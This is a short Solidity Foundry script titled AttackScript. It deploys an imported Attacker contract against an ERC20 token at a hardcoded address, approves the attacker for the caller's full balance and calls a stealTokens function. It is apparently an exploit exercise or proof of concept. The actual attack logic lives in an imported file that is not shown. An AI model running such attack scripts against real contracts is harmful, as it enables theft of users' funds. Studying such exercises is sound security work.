// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity 0.6.5;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

contract AttackScript is Script {

    Attacker attacker;
    ERC20 token = ERC20(0x78a705f2108B095e49161d6E42aDB7cB53E07e57);

    function setUp() public {
        vm.startBroadcast();
        attacker = new Attacker(token);
    }

    function run() public{
        //approve stealing 
        token.approve(address(attacker), token.balanceOf(msg.sender));
        //steal tokens 
        attacker.stealTokens(msg.sender);
    }
}
